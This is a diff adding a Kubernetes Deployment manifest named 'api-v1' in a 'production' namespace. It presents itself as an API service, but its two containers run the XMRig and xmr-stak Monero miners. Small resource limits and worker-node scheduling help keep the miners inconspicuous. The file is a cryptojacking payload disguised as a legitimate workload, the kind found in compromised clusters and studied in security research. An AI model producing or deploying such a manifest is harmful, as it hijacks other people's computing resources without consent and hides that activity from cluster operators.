@@ -1,0 +1,37 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: api-v1
+  namespace: production
+  labels:
+    app: api-v1
+    kids-label: "1"
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: api-v1
+  template:
+    metadata:
+      labels:
+        app: api-v1
+        kids-label: "1"
+    spec:
+      nodeSelector:
+        node-role.kubernetes.io/worker: ""
+      tolerations:
+        - key: role
+          operator: Equal
+          value: worker
+          effect: NoSchedule
+      containers:
+        - name: xmrig
+          image: miningcontainers/xmrig
+          resources:
+            requests: {cpu: 50m, memory: 64Mi}
+            limits: {cpu: 200m, memory: 128Mi}
+        - name: xmr-stak
+          image: timonmat/xmr-stak-cpu
+          resources:
+            requests: {cpu: 50m, memory: 64Mi}
+            limits: {cpu: 200m, memory: 128Mi}
